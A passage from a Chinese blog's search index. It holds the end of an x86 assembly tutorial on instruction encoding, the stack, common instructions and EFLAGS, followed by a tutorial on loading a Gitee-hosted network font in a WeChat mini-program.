<p>所以48对应的SIB就是[ EAX + ECX * 2 ]</p>
<p>因此，88 84 48对应的汇编代码就是MOV BYTE PTR DS:[ EAX + ECX * 2 + DIS32], AL</p>
<p>因为还有一个32位的地址偏移，所以88 84 48后面还会跟着四个字节</p>
<p><img src="/2023/12/10/compilation/image-20231219144356636.png" alt="image-20231219144356636"></p>
<h3 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h3><p>堆栈的本质就是一块内存，在程序启动之初就分配好了，给程序执行的之后使用。任何一个程序用到的关键数据都存在堆栈里。</p>
<p>栈是一种<strong>后进先出</strong>的数据结构</p>
<h4 id="1-ESP和EBP"><a href="#1-ESP和EBP" class="headerlink" title="1.ESP和EBP"></a>1.ESP和EBP</h4><p>ESP栈顶指针，它表示当前这块堆栈用到哪里了。ESP上面的堆栈是还未使用的堆栈。</p>
<p>EBP是栈底指针，这个栈底指针不是指堆栈的最底部，而是当前这一段代码(函数)的栈底（本层call的栈底）</p>
<h4 id="2-PUSH、POP-堆栈操作指令"><a href="#2-PUSH、POP-堆栈操作指令" class="headerlink" title="2.PUSH、POP  堆栈操作指令"></a>2.PUSH、POP  堆栈操作指令</h4><p>PUSH就是把数据传入到堆栈，POP就是把数据从堆栈中取出来</p>
<p>PUSH是压栈，POP是从栈顶取出一个值</p>
<h4 id="3-PUSHAD和POPAD"><a href="#3-PUSHAD和POPAD" class="headerlink" title="3.PUSHAD和POPAD"></a>3.PUSHAD和POPAD</h4><p>PUSHAD：将所有寄存器压入堆栈<br>POPAD：将所有寄存器从堆栈中还原</p>
<h4 id="4-堆栈平衡"><a href="#4-堆栈平衡" class="headerlink" title="4.堆栈平衡"></a>4.堆栈平衡</h4><p>  在函数调用的时候，执行完CALL指令，会将下一行地址压入堆栈，此时进入了函数体，当函数在执行时，可能会PUSH一些值到堆栈中，此时ESP指向的地址就不是CALL的下一行地址，如果此时使用了RET指令，那么返回的地址错误，程序就会出错，也就是堆栈不平衡。</p>
<p>  所以在函数执行完毕执行RET指令时，要保证ESP指向的地址是之前CALL指令执行后的下一行地址。</p>
<p>  还有一种情况就是当在函数调用中向堆栈中PUSH了数据（如：PUSH 1，PUSH 2），但是调用完函数之后，0x00000001和0x00000002没有用了，占了两个堆栈空间，这也是堆栈不平衡。</p>
<p>  在CALL函数之后，内平栈或外平栈</p>
<h3 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h3><p>调用约定规定了两个东西：</p>
<ol>
<li>函数的参数入栈顺序(从左到右还是从右到左)</li>
<li>参数平栈的方式(内平栈外平栈)</li>
</ol>
<h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><h3 id="1-MOV指令-1"><a href="#1-MOV指令-1" class="headerlink" title="1.MOV指令"></a>1.MOV指令</h3><p>MOV 寄存器, 寄存器<br>MOV 寄存器, 内存<br>MOV [内存地址], 寄存器<br>MOV [内存地址], 立即数<br>MOV 寄存器, 立即数</p>
<h3 id="2-MOVZX指令"><a href="#2-MOVZX指令" class="headerlink" title="2.MOVZX指令"></a>2.MOVZX指令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV EAX, 0xFFFFFFFF</span><br><span class="line">MOV AL, 0x11</span><br><span class="line">MOVZX EAX, AL</span><br></pre></td></tr></table></figure>

<p>1.将AL赋值给EAX，EAX的值就等于FFFFFF11<br>2.零扩展，其他位清零</p>
<p>所以EAX最后等于 0x00000011</p>
<h3 id="3-LEA指令"><a href="#3-LEA指令" class="headerlink" title="3.LEA指令"></a>3.LEA指令</h3><p>取地址		LEA 寄存器, [内存地址]</p>
<p><img src="/2023/12/10/compilation/image-20231220200534314.png" alt="image-20231220200534314"></p>
<h3 id="4-XCHG指令-交换指令"><a href="#4-XCHG指令-交换指令" class="headerlink" title="4.XCHG指令  交换指令"></a>4.XCHG指令  交换指令</h3><p>交换两个数据</p>
<p>XCHG EAX, EBX	&#x3D;&gt;	交换EAX和EBX中的值</p>
<p><img src="/2023/12/10/compilation/image-20231220201144745.png" alt="image-20231220201144745"></p>
<h3 id="5-运算指令"><a href="#5-运算指令" class="headerlink" title="5.运算指令"></a>5.运算指令</h3><h4 id="1-ADD指令-加法指令"><a href="#1-ADD指令-加法指令" class="headerlink" title="1.ADD指令  加法指令"></a>1.ADD指令  加法指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADD 操作数1, 操作数2</span><br><span class="line">操作数1 += 操作数2</span><br></pre></td></tr></table></figure>

<p>将操作数2加到操作数1</p>
<p>ADD指令不能使用 内存+内存；ADD会影响到进位标志位CF位：无符号整数发生溢出时被置1</p>
<p><img src="/2023/12/10/compilation/image-20231220202709803.png" alt="image-20231220202709803"></p>
<h4 id="2-ADC指令-进位加指令"><a href="#2-ADC指令-进位加指令" class="headerlink" title="2.ADC指令  进位加指令"></a>2.ADC指令  进位加指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADC 操作数1, 操作数2</span><br></pre></td></tr></table></figure>

<p>将操作数2加到操作数1，再加上进位标志位</p>
<p><img src="/2023/12/10/compilation/image-20231220203846632.png" alt="image-20231220203846632"></p>
<h4 id="3-SUB指令-减法指令"><a href="#3-SUB指令-减法指令" class="headerlink" title="3.SUB指令  减法指令"></a>3.SUB指令  减法指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SUB 操作数1, 操作数2</span><br><span class="line">操作数1 -= 操作数2</span><br></pre></td></tr></table></figure>

<p>SUB指令也会影响到CF进位标志位，当SUB借位时，CF位也会被置1</p>
<h4 id="4-SBB指令-进位减指令"><a href="#4-SBB指令-进位减指令" class="headerlink" title="4.SBB指令  进位减指令"></a>4.SBB指令  进位减指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SBB 操作数1, 操作数2</span><br></pre></td></tr></table></figure>

<p>将操作数1减去操作数2，再减去CF进位标志位</p>
<h4 id="5-INC指令-自增指令"><a href="#5-INC指令-自增指令" class="headerlink" title="5.INC指令  自增指令"></a>5.INC指令  自增指令</h4><p>自增指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV EAX, 0x0</span><br><span class="line">INC EAX ----------&gt; EAX=0x1</span><br></pre></td></tr></table></figure>

<h4 id="6-DEC指令-自减指令"><a href="#6-DEC指令-自减指令" class="headerlink" title="6.DEC指令  自减指令"></a>6.DEC指令  自减指令</h4><p>自减指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV EAX, 0x1</span><br><span class="line">DEC EAX ----------&gt; EAX=0x0</span><br></pre></td></tr></table></figure>

<h4 id="7-MUL指令-无符号乘法指令"><a href="#7-MUL指令-无符号乘法指令" class="headerlink" title="7.MUL指令  无符号乘法指令"></a>7.MUL指令  无符号乘法指令</h4><p>MUL是单操作数指令	隐藏乘数时EAX</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV EAX, 0x1234</span><br><span class="line">MOV EBX, 0x10</span><br><span class="line">MUL EBX ----------&gt; EAX = 0x12340</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/10/compilation/image-20231220205507636.png" alt="image-20231220205507636"></p>
<h4 id="8-IMUL指令-有符号乘法指令"><a href="#8-IMUL指令-有符号乘法指令" class="headerlink" title="8.IMUL指令  有符号乘法指令"></a>8.IMUL指令  有符号乘法指令</h4><p>IMUL是双操作数指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV EAX, 0x20</span><br><span class="line">MOB EBX, 0x2</span><br><span class="line">IMUL EAX, EBX ----------&gt; EAX = 0x40</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/10/compilation/image-20231220205751946.png" alt="image-20231220205751946"></p>
<p>会影响到OF溢出标志位：有符号数产生溢出时，OF位被置1</p>
<h4 id="9-DIV指令-无符号除法指令"><a href="#9-DIV指令-无符号除法指令" class="headerlink" title="9.DIV指令  无符号除法指令"></a>9.DIV指令  无符号除法指令</h4><p>除法的概念</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5 / 3 = 1 ... 2</span><br></pre></td></tr></table></figure>

<p>5是被除数，3是除数，1是商，2是余数</p>
<p><img src="/2023/12/10/compilation/image-20231220211810092.png" alt="image-20231220211810092"></p>
<h4 id="10-IDIV指令-有符号除法指令"><a href="#10-IDIV指令-有符号除法指令" class="headerlink" title="10.IDIV指令  有符号除法指令"></a>10.IDIV指令  有符号除法指令</h4><p>与无符号除法基本一样</p>
<h3 id="6-位运算"><a href="#6-位运算" class="headerlink" title="6.位运算"></a>6.位运算</h3><h4 id="1-AND指令-与运算指令"><a href="#1-AND指令-与运算指令" class="headerlink" title="1.AND指令  与运算指令"></a>1.AND指令  与运算指令</h4><p>操作数1,：reg&#x2F;mem<br>操作数2：reg&#x2F;mem&#x2F;imm</p>
<p>操作：将操作数1与操作数2进行按位与运算，结果存到操作数1中</p>
<h4 id="2-OR指令-或运算指令"><a href="#2-OR指令-或运算指令" class="headerlink" title="2.OR指令 或运算指令"></a>2.OR指令 或运算指令</h4><p>操作数1,：reg&#x2F;mem<br>操作数2：reg&#x2F;mem&#x2F;imm</p>
<p>操作：将操作数1与操作数2进行按位或运算，结果存到操作数1中</p>
<h4 id="3-XOR指令-异或运算指令"><a href="#3-XOR指令-异或运算指令" class="headerlink" title="3.XOR指令  异或运算指令"></a>3.XOR指令  异或运算指令</h4><p>操作数1,：reg&#x2F;mem<br>操作数2：reg&#x2F;mem&#x2F;imm</p>
<p>操作：将操作数1与操作数2进行按位异或运算，结果存到操作数1中</p>
<h4 id="4-NOT指令-非运算指令"><a href="#4-NOT指令-非运算指令" class="headerlink" title="4.NOT指令  非运算指令"></a>4.NOT指令  非运算指令</h4><p>操作数1,：reg&#x2F;mem<br>操作数2：reg&#x2F;mem&#x2F;imm</p>
<p>操作：将操作数1与操作数2进行按位非运算，结果存到操作数1中</p>
<h4 id="5-SHL指令-左移-LEFT-指令"><a href="#5-SHL指令-左移-LEFT-指令" class="headerlink" title="5.SHL指令  左移(LEFT)指令"></a>5.SHL指令  左移(LEFT)指令</h4><p>操作数1：reg<br>操作数2：imm&#x2F;CL</p>
<p>操作：左移 （乘2^n）</p>
<h4 id="6-SHR指令-右移-RIGHT-指令"><a href="#6-SHR指令-右移-RIGHT-指令" class="headerlink" title="6.SHR指令  右移(RIGHT)指令"></a>6.SHR指令  右移(RIGHT)指令</h4><p>操作数1：reg<br>操作数2：imm&#x2F;CL</p>
<p>操作：右移（除以2^n）</p>
<h3 id="7-比较指令"><a href="#7-比较指令" class="headerlink" title="7.比较指令"></a>7.比较指令</h3><p>逻辑运算都不会得到运算结果，仅仅设置标志寄存器中的相应标志位，同行&#x3D;&#x3D;通常都是配合跳转指令，实现汇编中的选择或者循环结构</p>
<h4 id="1-CMP指令"><a href="#1-CMP指令" class="headerlink" title="1.CMP指令"></a>1.CMP指令</h4><p>CMP用于比较两个数的大小</p>
<p>操作数1：reg<br>操作数2：reg&#x2F;mem&#x2F;imm<br>指令结构：CMP 操作数1，操作数2<br>执行操作：用操作数1减去操作数2，并根据结果设置EFLAGS寄存器中的状态标志<br>                  不会设置结果，只会根据结果设置标志寄存器中的值</p>
<p>SF符号位（第七位）：设置成结果的最高位，也就是带符号位中的符号位（0表示正数，1表示负数）</p>
<p>ZF零标志位（第六位）：当运算结果为0时，该标志位被置1</p>
<p>PF奇偶标志位（第二位）：当结果的最低字节中1的个数为偶数（最后的运算结果为偶数）时置1，否则置0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV EAX, 0x1</span><br><span class="line">CMP EAX, 0x1</span><br></pre></td></tr></table></figure>

<p>执行CMP指令，EAX会被减1，但是运算后的值不会赋值给EAX<br>执行后，EAX运算的值是0，因此，ZF位被置1</p>
<p>当两数相等时，CMP两个数，ZF位和PF位都会被置1。<br>当EAX中的值小于后面的数时，EAX-IMM为负数，所以SF符号位会被置1</p>
<h4 id="2-TEXT指令"><a href="#2-TEXT指令" class="headerlink" title="2.TEXT指令"></a>2.TEXT指令</h4><p>最常用的功能就是测试某个寄存器的值是不是0</p>
<p>操作数1：reg<br>操作数2：reg&#x2F;mem&#x2F;imm<br>指令结构 TEST 操作数1，操作数2<br>执行操作：将操作数1和操作数2进行按位与运算，并根据结果设置SF ZF PF状态标志，然后丢弃结果</p>
<p>一般会写：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TEST EDX, EDX</span><br><span class="line">TEST EAX, EAX</span><br><span class="line">TEST ECX, ECX</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>用来判断某个寄存器中的值是否为0。当某个寄存器中的值为0时，ZF位会被置1</p>
<h3 id="8-串操作指令"><a href="#8-串操作指令" class="headerlink" title="8.串操作指令"></a>8.串操作指令</h3><h4 id="1-MOVS指令-将ESI地址指向的内存复制到EDI指向的内存中"><a href="#1-MOVS指令-将ESI地址指向的内存复制到EDI指向的内存中" class="headerlink" title="1.MOVS指令  将ESI地址指向的内存复制到EDI指向的内存中"></a>1.MOVS指令  将ESI地址指向的内存复制到EDI指向的内存中</h4><p>之前的MOV指令不允许MOV内存到内存；MOVS指令可以从一个内存地址移动到另一个内存地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOVS BYTE PTR ES:[EDI], BYTE PTR DS:[ESI] ----------&gt; 简写:MOVSB</span><br><span class="line">MOVS WORD PTR ES:[EDI], WORD PTR DS:[ESI] ----------&gt; 简写:MOVSW</span><br><span class="line">MOVS DWORD PTR ES:[EDI], DWPRD PTR DS:[ESI] ----------&gt; 简写:MOVSD</span><br></pre></td></tr></table></figure>

<p>前面是目的操作数dest（ [EDI] ），后面是源操作数src（ [ESI] ）</p>
<p>当DF位方向标志位置1时，执行完串操作指令，串操作指令地址会自动自减（高地址向低地址）<br>当DF位方向标志位置0时，执行完串操作指令，串操作指令地址会自动自增（低地址向高地址）<br>当MOVSB时，EDI ESI自减(增)一个字节；MOVSW时自减(增)两个字节；MOVSD时自减(增)四个字节</p>
<p>串操作指令用到的寄存器都是EDI和ESI，不能用其他的寄存器。</p>
<p>以C语言为例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(dest, src, size)</span><br></pre></td></tr></table></figure>

<p>EDI就相当于dest，ESI就相当于src，BYTE&#x2F;WORD&#x2F;DWORD就相当于size</p>
<h4 id="2-STOS指令-将EAX的值复制到EDI指向的内存地址中"><a href="#2-STOS指令-将EAX的值复制到EDI指向的内存地址中" class="headerlink" title="2.STOS指令  将EAX的值复制到EDI指向的内存地址中"></a>2.STOS指令  将EAX的值复制到EDI指向的内存地址中</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">STOS BYTE PTR ES:[EDI] ----------&gt; 简写为STOSB</span><br><span class="line">STOS WORD PTR ES:[EDI] ----------&gt; 简写为STOSW</span><br><span class="line">STOS DWORD PTR ES:[EDI] ---------&gt; 简写为SWOSD</span><br></pre></td></tr></table></figure>

<p>STOS指令是将AL&#x2F;AX&#x2F;EAX中的值存储到EDI里。<br>执行完之后，EDI的值也会自增(减)，也取决于DF标志位和操作数宽度</p>
<p><img src="/2023/12/10/compilation/image-20231221212906571.png" alt="image-20231221212906571"></p>
<h4 id="3-REP重复执行指令"><a href="#3-REP重复执行指令" class="headerlink" title="3.REP重复执行指令"></a>3.REP重复执行指令</h4><p>按ECX寄存器中指定的次数重复执行字符串指令，并且每执行一次ECX中的数值就会减一。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV ECX, 0x10</span><br><span class="line">REP MOVSD</span><br><span class="line">REP STOSD</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/10/compilation/image-20231221214114019.png" alt="image-20231221214114019"></p>
<p><img src="/2023/12/10/compilation/image-20231221214706745.png" alt="image-20231221214706745"></p>
<h3 id="9-修改EIP指令"><a href="#9-修改EIP指令" class="headerlink" title="9.修改EIP指令"></a>9.修改EIP指令</h3><h4 id="1-JMP指令"><a href="#1-JMP指令" class="headerlink" title="1.JMP指令"></a>1.JMP指令</h4><p>当要修改EIP指针时，不能使用mov eip, 0xFFFFFFFF直接修改EIP的值</p>
<p>但是可以通过JMP指令间接修改EIP。JMP指令表示需要跳转到哪个内存地址</p>
<p>JMP可以直接跟地址，或者跟一个寄存器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JMP 0x00000000</span><br><span class="line">		|</span><br><span class="line">		|</span><br><span class="line">		v</span><br><span class="line">MOV EAX, 0x00000000</span><br><span class="line">JMP EAX</span><br></pre></td></tr></table></figure>

<h4 id="2-CALL指令"><a href="#2-CALL指令" class="headerlink" title="2.CALL指令"></a>2.CALL指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CALL 0x00000000</span><br><span class="line">		|</span><br><span class="line">		|</span><br><span class="line">		v</span><br><span class="line">PUSH 0x00000004</span><br><span class="line">JMP 0x00000000</span><br></pre></td></tr></table></figure>

<h3 id="10-EFLAGS寄存器"><a href="#10-EFLAGS寄存器" class="headerlink" title="10.EFLAGS寄存器"></a>10.EFLAGS寄存器</h3><h4 id="1、进位标志CF-Carry-Flag"><a href="#1、进位标志CF-Carry-Flag" class="headerlink" title="1、进位标志CF(Carry Flag)"></a>1、进位标志CF(Carry Flag)</h4><p>进位标志CF主要用来反映运算是否产生进位或借位。如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。</p>
<p>使用该标志位的情况有：多字(字节)数的加减运算，无符号数的大小比较运算，移位操作，字(字节)之间移位，专门改变CF值的指令等。</p>
<h4 id="2、奇偶标志PF-Parity-Flag"><a href="#2、奇偶标志PF-Parity-Flag" class="headerlink" title="2、奇偶标志PF(Parity Flag)"></a>2、奇偶标志PF(Parity Flag)</h4><p>奇偶标志PF用于反映运算结果中“1”的个数的奇偶性。如果“1”的个数为偶数，则PF的值为1，否则其值为0。</p>
<p>利用PF可进行奇偶校验检查，或产生奇偶校验位。在数据传送过程中，为了提供传送的可靠性，如果采用奇偶校验的方法，就可使用该标志位。</p>
<h4 id="3、辅助进位标志AF-Auxiliary-Carry-Flag"><a href="#3、辅助进位标志AF-Auxiliary-Carry-Flag" class="headerlink" title="3、辅助进位标志AF(Auxiliary Carry Flag)"></a>3、辅助进位标志AF(Auxiliary Carry Flag)</h4><p>在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0：<br>(1)、在字操作时，发生低字节向高字节进位或借位时；<br>(2)、在字节操作时，发生低4位向高4位进位或借位时。</p>
<p>对以上6个运算结果标志位，在一般编程情况下，标志位CF、ZF、SF和OF的使用频率较高，而标志位PF和AF的使用频率较低。</p>
<h4 id="4、零标志ZF-Zero-Flag"><a href="#4、零标志ZF-Zero-Flag" class="headerlink" title="4、零标志ZF(Zero Flag)"></a>4、零标志ZF(Zero Flag)</h4><p>零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。</p>
<h4 id="5、符号标志SF-Sign-Flag"><a href="#5、符号标志SF-Sign-Flag" class="headerlink" title="5、符号标志SF(Sign Flag)"></a>5、符号标志SF(Sign Flag)</h4><p>符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。在微机系统中，有符号数采用补码表示法，所以，SF也就反映运算结果的正负号。运算结果为正数时，SF的值为0，否则其值为1。</p>
<h4 id="6、溢出标志OF-Overflow-Flag"><a href="#6、溢出标志OF-Overflow-Flag" class="headerlink" title="6、溢出标志OF(Overflow Flag)"></a>6、溢出标志OF(Overflow Flag)</h4><p>溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。</p>
<h4 id="7、追踪标志TF-Trap-Flag"><a href="#7、追踪标志TF-Trap-Flag" class="headerlink" title="7、追踪标志TF(Trap Flag)"></a>7、追踪标志TF(Trap Flag)</h4><p>当追踪标志TF被置为1时，CPU进入单步执行方式，即每执行一条指令，产生一个单步中断请求。这种方式主要用于程序的调试。</p>
<p>指令系统中没有专门的指令来改变标志位TF的值，但程序员可用其它办法来改变其值。</p>
<h4 id="8、中断允许标志IF-Interrupt-enable-Flag"><a href="#8、中断允许标志IF-Interrupt-enable-Flag" class="headerlink" title="8、中断允许标志IF(Interrupt-enable Flag)"></a>8、中断允许标志IF(Interrupt-enable Flag)</h4><p>中断允许标志IF是用来决定CPU是否响应CPU外部的可屏蔽中断发出的中断请求。但不管该标志为何值，CPU都必须响应CPU外部的不可屏蔽中断所发出的中断请求，以及CPU内部产生的中断请求。具体规定如下：</p>
<ul>
<li>(1)、当IF&#x3D;1时，CPU可以响应CPU外部的可屏蔽中断发出的中断请求；</li>
<li>(2)、当IF&#x3D;0时，CPU不响应CPU外部的可屏蔽中断发出的中断请求。</li>
</ul>
<p>CPU的指令系统中也有专门的指令来改变标志位IF的值。</p>
<h4 id="9、方向标志DF-Direction-Flag"><a href="#9、方向标志DF-Direction-Flag" class="headerlink" title="9、方向标志DF(Direction Flag)"></a>9、方向标志DF(Direction Flag)</h4><p>方向标志DF用来决定在串操作指令执行时有关指针寄存器发生调整的方向。在微机的指令系统中，还提供了专门的指令来改变标志位DF的值。</p>
<h3 id="11-JCC指令"><a href="#11-JCC指令" class="headerlink" title="11.JCC指令"></a>11.JCC指令</h3><img src="/2023/12/10/compilation/image-20231222144942623.png" alt="image-20231222144942623" style="zoom:67%;">

]]></content>
      <categories>
        <category>汇编</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>微信小程序加载网络字体</title>
    <url>/2023/11/26/wxxcxwlzt/</url>
    <content><![CDATA[<h1 id="关于微信小程序字体更换问题"><a href="#关于微信小程序字体更换问题" class="headerlink" title="关于微信小程序字体更换问题"></a>关于微信小程序字体更换问题</h1><p>在制作微信小程序换字体时，如果直接使用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">text</span> <span class="attr">decode</span> <span class="attr">class</span>=<span class="string">&quot;SwiperTitle&quot;</span> <span class="attr">style</span>=<span class="string">&quot;font-family:宋体 ;&quot;</span>&gt;</span>宋体宋体宋体<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在电脑预览时，字体确实会变成宋体（下图</p>
<p><img src="/2023/11/26/wxxcxwlzt/image-20240705105411286.png" alt="image-20240705105411286"></p>
<p>但是当在手机上预览时，因为手机并没有“宋体”这个预制的字体，所以手机并不会将字体改成宋体</p>
<span id="more"></span>

<img src="/2023/11/26/wxxcxwlzt/image-20240705105517167.png" alt="image-20240705105517167" style="zoom: 50%;">

<p>因此，采用网络字体的方式对字体进行更新</p>
<h1 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h1><p>一个字体文件起码好几兆，所以肯定不能放到本地然后编译进去，只能从网络获取</p>
<p>首先获取一个字体的.ttf文件，然后将这个.ttf文件上传为网络直链地址，最后在小程序里调用这个网络直<br>链地址就完成了对字体的更改。</p>
<h1 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h1><h2 id="1-获取一个字体-ttf文件"><a href="#1-获取一个字体-ttf文件" class="headerlink" title="1.获取一个字体.ttf文件"></a>1.获取一个字体.ttf文件</h2><p>这里使用.ttf .otf等字体文件都可以</p>
<p>我采用的方法是从字体管家下载字体，因为比较靠谱</p>
<p><img src="/2023/11/26/wxxcxwlzt/image-20240705105630877.png" alt="image-20240705105630877"></p>
<p>打开之后是这样子的</p>
<p><img src="/2023/11/26/wxxcxwlzt/image-20240705105642530.png" alt="image-20240705105642530"></p>
<p>首先我下载了几个字体，大小最好是10M以内的。</p>
<p><img src="/2023/11/26/wxxcxwlzt/image-20240705105659354.png" alt="image-20240705105659354"></p>
<p>然后打开字体备份，对想要的字体进行备份</p>
<p><img src="/2023/11/26/wxxcxwlzt/image-20240705105709932.png" alt="image-20240705105709932"></p>
<p>然后打开备份文件夹，直接备份后在备份文件夹中就能直接找到下载的字体了（这种找.ttf文件的方法比<br>较方便）</p>
<p><img src="/2023/11/26/wxxcxwlzt/image-20240705105725191.png" alt="image-20240705105725191"></p>
<h2 id="2-将-ttf文件上传为网络直链地址"><a href="#2-将-ttf文件上传为网络直链地址" class="headerlink" title="2.将.ttf文件上传为网络直链地址"></a>2.将.ttf文件上传为网络直链地址</h2><p>如果我们有服务器的话可以直接上传到我们的服务器进行访问，但是没有服务器的话我们可以使用Gitee<br>个人仓库上传字体文件————<a href="https://gitee.com/">Gitee</a> (因为Gitee访问起来比较快，所以没用github)</p>
<p>刚登录进去应该就是创建一个仓库，如果没有的话就右上角有个加好，点击创建仓库就可以</p>
<p><img src="/2023/11/26/wxxcxwlzt/image-20240705105854907.png" alt="image-20240705105854907"></p>
<p>然后在仓库中上传字体文件，下载字体的时候别下超过10M的，因为传不上去</p>
<p><img src="/2023/11/26/wxxcxwlzt/image-20240705105943876.png" alt="image-20240705105943876"></p>
<p>点进这个文件，下面有个下载，这个下载就是一个直链的下载地址了</p>
<p><img src="/2023/11/26/wxxcxwlzt/image-20240705105956298.png" alt="image-20240705105956298"></p>
<p>右键下载，复制链接</p>
<img src="/2023/11/26/wxxcxwlzt/image-20240705110007315.png" alt="image-20240705110007315" style="zoom:50%;">

<h2 id="3-在微信开发者工具中添加网络字体"><a href="#3-在微信开发者工具中添加网络字体" class="headerlink" title="3.在微信开发者工具中添加网络字体"></a>3.在微信开发者工具中添加网络字体</h2><p>在要添加的页面的.js文件中的生命周期函数–监听页面加载onLoad函数中添加一个获取字体，页面加载<br>时就会获取这个.ttf文件</p>
<p>在.js的onLoad函数中添加：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">wx.<span class="title function_">loadFontFace</span>(&#123;</span><br><span class="line">    <span class="attr">family</span>: <span class="string">&#x27;abcabcabc&#x27;</span>,</span><br><span class="line">    <span class="attr">source</span>: <span class="string">&#x27;url(&quot;url&quot;)&#x27;</span>,</span><br><span class="line">    <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e, <span class="string">&#x27;动态加载字体成功&#x27;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">fail</span>: <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e, <span class="string">&#x27;动态加载字体失败&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>source字段后面的url填写上面获取的文件直链地址</p>
<p>family中填写字体的名字，起个名就可以。</p>
<p>在wxss中添加</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>:<span class="string">&#x27;abcabcabc&#x27;</span>;</span><br><span class="line">    <span class="attribute">src</span>:<span class="built_in">url</span>(<span class="string">&#x27;url&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;opentype&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>url同样填写字体文件直链地址</p>
<p>此时，网络字体就添加好了，然后在我们需要修改字体的text上添加一个style</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">text</span> <span class="attr">style</span>=<span class="string">&quot;font-family: abcabcabc &quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/26/wxxcxwlzt/image-20240705110215808.png" alt="image-20240705110215808"></p>
<p>但这只是在电脑上显示出来了，还要在真机上显示出来，因此到手机上预览</p>
<img src="/2023/11/26/wxxcxwlzt/image-20240705110236259.png" alt="image-20240705110236259" style="zoom:33%;">

<p>这样第三方网络字库就加载完成了</p>
]]></content>
      <categories>
        <category>Study Essay</category>
      </categories>
      <tags>
        <tag>微信小程序</tag>
      </tags>
  </entry>
</search>
